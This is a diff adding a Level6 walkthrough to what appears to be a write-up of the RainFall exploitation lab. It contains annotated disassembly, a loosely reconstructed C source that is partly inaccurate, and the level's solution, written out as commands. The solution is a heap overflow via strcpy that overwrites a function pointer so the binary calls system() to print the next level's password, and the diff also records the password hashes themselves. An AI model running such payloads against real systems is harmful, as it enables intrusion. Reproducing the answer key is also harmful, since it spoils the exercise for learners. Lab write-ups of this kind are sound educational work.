@@ -1226,6 +1226,165 @@ cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
 
+## Level6
+
+- [`objdump -d` output](http://ix.io/2dwZ)
+
+### ASM Interpretation
+
+```asm
+(gdb) disas main
+Dump of assembler code for function main:
+   0x0804847c <+0>:     push   ebp ; ASM Prologue
+   0x0804847d <+1>:     mov    ebp,esp ; ASM Prologue
+
+   0x0804847f <+3>:     and    esp,0xfffffff0 ; Align esp
+   0x08048482 <+6>:     sub    esp,0x20 ; Allocate 0x20 / 32 bytes on the stack
+   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40 ; Move 0x40 / 64 to first argument of malloc()
+   0x0804848c <+16>:    call   0x8048350 <malloc@plt> ; Call malloc(64)
+     ; void *malloc(size_t size);
+   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax ; Set the 28th byte of the stack to eax
+   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4 ; Set 0x4 / 4 as 1st argument of malloc()
+   0x0804849c <+32>:    call   0x8048350 <malloc@plt> ; Call malloc(4)
+   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax ; Set the 24th byte of the stack to eax
+   0x080484a5 <+41>:    mov    edx,0x8048468 ; Set edx to the address of m()
+   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
+   0x080484ae <+50>:    mov    DWORD PTR [eax],edx ; Set eax to edx
+   
+   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc] ; Set eax to 12 byte before the beginning of the stack
+   0x080484b3 <+55>:    add    eax,0x4 ; Add 4 to eax
+   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax] ;
+   0x080484b8 <+60>:    mov    edx,eax ; Set edx to eax
+   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
+   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx ; Set the 2nd argument of strcpy() to edx
+   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax ; Set the 1st argument of strcpy to eax
+   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt> ; Call strcpy(eax, edx)
+     ; char *strcpy(char * dst, const char * src);
+   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
+   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
+   0x080484d0 <+84>:    call   eax ; Call eax()
+   0x080484d2 <+86>:    leave ; ASM Epilogue
+   0x080484d3 <+87>:    ret ; ASM Epilogue
+End of assembler dump.
+
+(gdb) disas m
+Dump of assembler code for function m:
+   0x08048468 <+0>:     push   ebp ; ASM Prologue
+   0x08048469 <+1>:     mov    ebp,esp ; ASM Prologue
+   0x0804846b <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
+   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1 ; printf "%s", 0x80485d1 -> "Nope"; Set the 1st argument of puts() to "Nope"
+   0x08048475 <+13>:    call   0x8048360 <puts@plt> ; Call puts("Nope");
+   0x0804847a <+18>:    leave ; ASM Epilogue
+   0x0804847b <+19>:    ret ; ASM Epilogue
+End of assembler dump.
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x08048454 <+0>:     push   ebp ; ASM Prologue
+   0x08048455 <+1>:     mov    ebp,esp ; ASM Prologue
+   0x08048457 <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
+   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0 ; printf "%s", 0x80485b0 -> "/bin/cat /home/user/level7/.pass" ; Set the 1st argument of system() to "/bin/cat /home/user/level7/.pass"
+   0x08048461 <+13>:    call   0x8048370 <system@plt> ; Call system("/bin/cat /home/user/level7/.pass")
+   0x08048466 <+18>:    leave ; ASM Epilogue
+   0x08048467 <+19>:    ret ; ASM Epilogue
+End of assembler dump.
+```
+
+### Equivalent C source code
+
+
+
+```c
+#include <stdio.h>
+
+void    n() {
+        unsigned char buf[24];
+
+        system("bin/cat /home/user/level7/.pass");
+}
+
+void    m() {
+        unsigned char buf[24];
+
+        puts("Nope");
+}
+
+int     main(int ac, char **av) {
+        unsigned char   buf[32];
+
+        (void *)(*(buf + 28)) = malloc(64);
+        (void *)(*(buf + 24)) = malloc(4);
+        (void *)(*(buf + 24)) = &m;
+        strcpy(&buf[28], *(buf - 12) + 4);
+        *(&buf[24])();
+        return ;
+}
+```
+
+### Walktrough
+
+```bash
+level6@RainFall:~$ ./level6
+Segmentation fault (core dumped)
+
+level6@RainFall:~$ ./level6 a
+Nope
+```
+
+- As we can see the program segfaults when no arguments are passed we can know it uses argv[1]
+
+```bash
+level6@RainFall:~$ ./level6  $(python -c 'print "A"*71')
+Nope
+
+level6@RainFall:~$ ./level6  $(python -c 'print "A"*72')
+Segmentation fault (core dumped)
+
+(gdb) run  $(python -c 'print "A"*72')
+Starting program: /home/user/level6/level6 $(python -c 'print "A"*72')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048408 in __do_global_dtors_aux ()
+```
+
+- It also segfaults when the 1st argument is longer than 71 bytes, it looks like the [73 to 76] bytes can be used to overwrite EIP
+
+```bash
+(gdb) run $(python -c 'print "A"*76')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level6/level6 $(python -c 'print "A"*76')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+---
+
+level6@RainFall:~$ gdb ./level6
+gdb$ run $(python -c 'print "A"*72+"B"*4')
+Starting program: /home/user/level6/level6 $(python -c 'print "A"*72+"B"*4')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+```
+
+- Let's try with the address of n() instead (`0x08048454`)
+
+```
+
+level6@RainFall:~$ ./level6  $(python -c 'print "A"*72')$(echo -n -e '\x54\x84\x04\x08')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+## Level7
+
+- [`objdump -d` output](http://ix.io/2dxJ)
+
+### ASM Interpretation
+
+### Equivalent C source code
+
+### Walktrough
+
 ## Misc / References
 
 ### ASM Cheatsheets
@@ -1302,4 +1461,5 @@ level3 -> 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 level4 -> b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 level5 -> 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 level6 -> d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+level7 -> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 ```
